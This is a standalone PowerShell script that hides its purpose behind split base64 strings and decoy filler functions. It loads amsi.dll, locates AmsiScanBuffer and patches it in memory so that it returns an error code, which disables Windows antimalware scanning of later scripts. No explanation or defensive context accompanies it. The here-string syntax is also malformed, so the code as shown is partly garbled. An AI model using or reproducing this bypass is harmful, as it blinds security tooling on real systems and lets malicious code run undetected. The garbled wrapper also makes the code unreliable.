$Win32 = @[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('CnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwpwdWJsaWMgY2xhc3MgV2luMzIgewogICAgW0RsbEltcG9ydCg='))kernel32[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('KV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKICAgIFtEbGxJbXBvcnQo'))kernel32[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('KV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CiAgICBbRGxsSW1wb3J0KA=='))kernel32[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('KV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBkd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cn0K'))@
Add-Type $Win32
0 | Out-Null
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YW0=')) + [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2kuZGxs')))
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW1zaQ==')) + [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Nhbg==')) + [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QnVmZmVy')))
0 | Out-Null
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
function Dfn_chtstp { param() $null = (1 + 0) }
function Dfn_vidbqb { param() $null = (1 + 1) }
function Dfn_szydcx { param() $null = (1 + 2) }
function Dfn_vsrxyf { param() $null = (1 + 3) }
function Dfn_ededjo { param() $null = (1 + 4) }
